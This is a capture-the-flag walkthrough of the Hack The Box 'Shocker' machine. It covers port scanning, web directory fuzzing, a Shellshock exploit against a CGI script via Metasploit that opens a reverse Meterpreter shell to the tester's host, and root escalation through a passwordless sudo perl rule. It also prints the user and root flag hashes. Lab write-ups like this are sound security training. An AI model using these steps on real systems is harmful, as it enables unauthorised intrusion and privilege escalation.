# MACHINE CHALLENGE: SHOCKER

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.56
OS: Linux
```

### NAME OF THE MACHINE AS A HINT?

Does "shocker" imply a shell shock vulnerability?

### PORTSCANNING w/ NMAP

Use `nmap` to see if we can detect what services our host is offering, what
operating system (and version) our host is running, what type of packet
filters/firewalls are in use, etc.

```
$ sudo nmap -A -sS -T4 10.10.10.56 > nmap.out

Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-21 18:33 EST
Nmap scan report for 10.10.10.56
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

So we have two open services - http(80) and ssh(2222).

### ENUMERATING PORT 80 (HTTP)

Visiting the webpage we are greeted with "Don't Bug Me!"..

```
http://10.10.10.56
```

<img src="https://github.com/fortyfunbobby/security-projects/blob/master/hackthebox/machines/shocker/index.html.jpg" width=500px/>

##### GOBUSTER

Bruteforce enumeration using `gobuster` yields..

```
$ gobuster -e -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.56/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Expanded     : true
=====================================================
```

Hm.. gobuster doesn't find anything..

##### BURPSUITE

So what if we examine the response coming back from the server when we hit
port 80..

```
<REQUEST>
GET / HTTP/1.1
Host: 10.10.10.56
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Fri, 22 Sep 2017 20:01:19 GMT
If-None-Match: "89-559ccac257884-gzip"
Cache-Control: max-age=0
</REQUEST>
```

```
<RESPONSE>
HTTP/1.1 200 OK
Date: Fri, 22 Dec 2017 16:04:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
ETag: "89-559ccac257884-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 137
Connection: close
Content-Type: text/html
<!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
</RESPONSE>
```

Hm.. nothing there.

##### STRING ANALYSIS

Tried downloading the image to see if there was any hints there, but couldn't
see anything..

```
$ strings bug.jpg | tail -5
03R1
>4;=
u)Vk
19%A
N)G4Q@
```

##### METASPLOIT

```
$ sudo service postgresql start
$ sudo msfdb init
$ msfconsole
msf > db_status
[*] postgresql connected to msf

msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf auxiliary(ssh_login) > set RPORT 2222
RPORT => 2222
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(ssh_login) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/mirai_user_pass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/mirai_user_pass.txt
msf auxiliary(ssh_login) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
msf auxiliary(ssh_login) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

That got me no where..

##### DIRBUSTER

Okay, let's try other enumeration tools.

```
$ dirb http://10.10.10.56 /usr/share/wordlists/dirb/small.txt -x /usr/share/wordlists/dirb/extensions_common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Dec 22 17:35:19 2017
URL_BASE: http://10.10.10.56/
WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt
EXTENSIONS_FILE: /usr/share/wordlists/dirb/extensions_common.txt | ()(.bash)(.sh)(.bsh)(/) [NUM = 5]

-----------------

GENERATED WORDS: 959                                                           

---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                              
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                              
+ http://10.10.10.56/cgi-bin// (CODE:403|SIZE:295)                             
+ http://10.10.10.56/icons/ (CODE:403|SIZE:292)                                
                                                                               
-----------------
END_TIME: Fri Dec 22 21:20:43 2017
DOWNLOADED: 4795 - FOUND: 4
```

So we've discovered two directories: `cgi-bin` and `icons`. Let's focus on `cgi-bin`
since that is where interesting scripts are more likely to lie.

##### WFUZZ

Directory buster was taking too long to iterate, so tried `wfuzz` and it found a script
called `cgi-bin/user.sh`.

```
$ wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 http://10.10.10.56/cgi-bin/FUZZ.sh
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.3 - The Web Fuzzer                         *
********************************************************

Target: HTTP://10.10.10.56/cgi-bin/FUZZ.sh
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

00929:  C=404      9 L	      32 W	    309 Ch	  "Database_Administrati
00932:  C=404      9 L	      34 W	    308 Ch	  "Documents and Setting
01897:  C=404      9 L	      32 W	    307 Ch	  "administratoraccounts
05733:  C=404      9 L	      32 W	    309 Ch	  "database_administrati
17586:  C=404      9 L	      32 W	    307 Ch	  "system_administration
17584:  C=404      9 L	      32 W	    307 Ch	  "system-administration
18833:  C=200      7 L	      17 W	    118 Ch	  "user"
00015:  C=403     11 L	      32 W	    306 Ch	  ".htaccess"
00016:  C=403     11 L	      32 W	    306 Ch	  ".htpasswd"

Total time: 1392.094
Processed Requests: 20469
Filtered Requests: 20466
Requests/sec.: 14.70374

```

Downloading that script yields:

```
http://10.10.10.56/cgi-bin/user.sh

$ cat user.sh 
Content-Type: text/plain

Just an uptime test script

 22:56:04 up  5:46,  0 users,  load average: 0.08, 0.08, 0.03
```

Not sure if this is anything? Also tried fuzzing over `.bash` and `.cgi` and found
nothing else.

### METASPLOIT SHELL SHOCK?

A google search on metasploit options against `cgi-bin` yields this:

```
https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec

Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles
external environment variables. This module targets CGI scripts in the Apache web server
by setting the HTTP_USER_AGENT environment variable to a malicious function definition.
```

So let's give this a try!

```
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) > set RHOST 10.10.10.56
RHOST => 10.10.10.56
msf exploit(apache_mod_cgi_bash_env_exec) > set TARGETURI http://10.10.10.56/cgi-bin/user.sh
TARGETURI => http://10.10.10.56/cgi-bin/user.sh
msf exploit(apache_mod_cgi_bash_env_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf exploit(apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.16.124:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (847604 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.16.124:4444 -> 10.10.10.56:57606) at 2017-12-22 23:52:04 -0500

meterpreter > ls
Listing: /usr/lib/cgi-bin
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  113   fil   2017-09-22 15:29:26 -0400  user.sh

meterpreter > pwd
/usr/lib/cgi-bin
```

Amazing! We're in!

### OWN USER

```
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2017-09-22 15:49:12 -0400  shelly

meterpreter > cd shelly
meterpreter > ls
Listing: /home/shelly
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-09-25 08:29:38 -0400  .bash_history
100644/rw-r--r--  220   fil   2017-09-22 12:33:54 -0400  .bash_logout
100644/rw-r--r--  3771  fil   2017-09-22 12:33:54 -0400  .bashrc
40700/rwx------   4096  dir   2017-09-22 12:35:28 -0400  .cache
40775/rwxrwxr-x   4096  dir   2017-09-22 15:49:12 -0400  .nano
100644/rw-r--r--  655   fil   2017-09-22 12:33:54 -0400  .profile
100644/rw-r--r--  66    fil   2017-09-22 15:43:04 -0400  .selected_editor
100644/rw-r--r--  0     fil   2017-09-22 12:35:31 -0400  .sudo_as_admin_successful
100644/rw-r--r--  33    fil   2017-09-22 15:37:05 -0400  user.txt

meterpreter > cat user.txt
2ec24e11320026d1e70ff3e16695b233
```

### OWN MACHINE

Attempting to go straight for `/root/root.txt` directly (as expected) doesn't work:

```
meterpreter > ls /root
[-] stdapi_fs_ls: Operation failed: 1
```

If we recall, in the `/home` directory of user `shelly`, we saw a file called
`.sudo_as_admin_successful`.  Might that be a hint that we should be attempting to `sudo`
to an administrator user?  Let's get some help from automated Linux Priviledge Escalation
tool..

```
https://www.rebootuser.com/?p=1758

LinEnum will automate many of the checks that I’ve documented in the Local Linux
Enumeration & Privilege Escalation Cheatsheet. It’s a very basic shell script that
performs over 65 checks, getting anything from kernel information to locating possible
escalation points such as potentially useful SUID/GUID files and Sudo/rhost
mis-configurations and more.
```

So let's upload this script and see what we get!

```
meterpreter > upload LinEnum.sh /tmp
[*] uploading  : LinEnum.sh -> /tmp
[*] uploaded   : LinEnum.sh -> /tmp/LinEnum.sh
meterpreter > shell
Process 7565 created.
Channel 19 created.
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh > /tmp/LinEnum.out
^C  
Terminate channel 20? [y/N]  y
meterpreter > download /tmp/LinEnum.out /tmp
[*] Downloading: /tmp/LinEnum.out -> /tmp/LinEnum.out
[*] Downloaded 231.60 KiB of 231.60 KiB (100.0%): /tmp/LinEnum.out -> /tmp/LinEnum.out
[*] download   : /tmp/LinEnum.out -> /tmp/LinEnum.out
```

Browsing through the output, we see something interesting:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Just as the hint `.sudo_as_admin_successful` led us to believe, the ability to `sudo` to
`root`! So let's write a simple `perl` script and get to work!

```
meterpreter > cat /tmp/gimme_root.pl
#! /usr/bin/perl

system ('cat /root/root.txt');
meterpreter > shell
Process 7236 created.
Channel 16 created.
/usr/bin/perl /tmp/gimme_root.pl
cat: /root/root.txt: Permission denied
sudo /usr/bin/perl /tmp/gimme_root.pl
52c2715605d70c7619030560dc1ca467
```
